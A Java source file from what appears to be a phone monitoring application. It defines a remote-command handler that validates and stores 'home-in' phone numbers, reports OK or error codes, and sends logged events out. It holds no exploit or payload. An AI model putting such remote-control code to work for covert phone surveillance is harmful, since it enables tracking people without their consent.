package com.vvt.rmtcmd.pcc;

import java.util.Vector;

import com.vvt.global.Global;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCAddHomeInNumb extends PCCRmtCmdSync {

	private SendEventManager eventSender = Global.getSendEventManager();
	
	public PCCAddHomeInNumb(Vector homeInNumbers) {
		numberList = homeInNumbers;
	}
	
	// PCCRmtCmdSync
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.ADD_HOMEIN.getId());
		try {
			if (isInvalidNumber() || (numberList.size() == 0)) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.INVALID_HOMEIN_NUMBER);		
			} else if (isDuplicateHomeInNumber()) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.DUPLICATE_HOMEIN_NUMBER);			
			} else if (isExceededHomeInNumberDB()) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.EXCEEDED_HOMEIN_NUMBER);
			} else {
				addHomeInNumberDB();
				responseMessage.append(Constant.OK);	
			}
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
}
